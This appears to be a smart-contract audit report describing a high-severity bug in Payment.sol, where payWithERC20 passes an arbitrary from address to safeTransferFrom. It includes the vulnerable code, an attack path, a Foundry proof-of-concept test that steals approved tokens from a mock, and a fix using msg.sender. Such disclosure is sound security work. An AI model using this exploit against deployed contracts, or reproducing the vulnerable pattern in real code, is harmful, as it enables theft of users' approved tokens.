# [H-1] Arbitrary from passed to transferFrom in Payment.sol::payWithERC20 function
## Summary
The payWithERC20 function in the Payment.sol contract is designed to support a gasless flow. While the protocol assumes that the caller is always the msg.sender, this is not strictly enforced. If a user approves the contract to transfer tokens on their behalf, an attacker can front-run the transaction and replace the from address with the victim’s address, effectively transferring tokens to themselves. This could result in unintended token loss for the user.

## Root Cause
in the payWithERC20 function , token.safeTransferFrom(fromAddress, toAddress, amount) uses arbitrary from address instead of using msg.sender.

 ```solidity
  function payWithERC20(address erc20TokenAddress, uint256 amount, address fromAddress, address toAddress) public {  
        // check from and to address  
        require(fromAddress != toAddress, "Cannot transfer to self address");  
        require(toAddress != address(0), "Invalid to address");  
        require(amount > 0, "Amount must be greater than 0");  
        IERC20 token = IERC20(erc20TokenAddress);  
@>        token.safeTransferFrom(fromAddress, toAddress, amount);  
    } 
``` 
## Internal Pre-conditions

a user need to approve the contract some tokens.
## External Pre-conditions
nil

## Attack Path
alice approves the Payment.sol contract some tokens to use the function payWithERC20
bob see's that alice approved the contract some tokens.
bob transfers the tokens approved by alice using the payWithERC20 function setting the to address to bob.

## Impact
the user approving the contract will lose tokens

## PoC
paste this file in a test file and run the test using forge test --mt test_arbitaryTransferFrom
```solidity

// SPDX-License-Identifier: SEE LICENSE IN LICENSE  
pragma solidity ^0.8.26;  
  
import {Test, console} from "forge-std/Test.sol";  
import {Payment} from "../src/Payment.sol";  
import {MockERC20} from "./MockERC20.sol";  
  
contract PaymentTest is Test {  
    Payment payment;  
    MockERC20 mock;  
    address user = makeAddr("user");  
    address alice = makeAddr("alice");  
  
  
    function setUp() external {  
        payment = new Payment();  
        mock = new MockERC20();  
        mock.mint(user, 10e18);  
    }  
  
    function test_arbitaryTransferFrom() external {  
        //1.user appproves the contract to transfer token  
        vm.prank(user);  
        mock.approve(address(payment), 10e18);  
        //2. alice sees this approval and transfers the tokens to herself.  
        vm.prank(alice);  
        payment.payWithERC20(address(mock), 10e18, user, alice);  
        assert(mock.balanceOf(user) == 0);  
        assert(mock.balanceOf(alice) == 10e18);  
    }  
}  
  
```  
## Reccomended Mitigation
```diff
 function payWithERC20(address erc20TokenAddress, uint256 amount, address fromAddress, address toAddress) public {  
        // check from and to address  
        require(fromAddress != toAddress, "Cannot transfer to self address");  
        require(toAddress != address(0), "Invalid to address");  
        require(amount > 0, "Amount must be greater than 0");  
        IERC20 token = IERC20(erc20TokenAddress);  
-       token.safeTransferFrom(fromAddress, toAddress, amount);  
+      token.safeTransferFrom(msg.sender, toAddress, amount)  
    } 
``` 
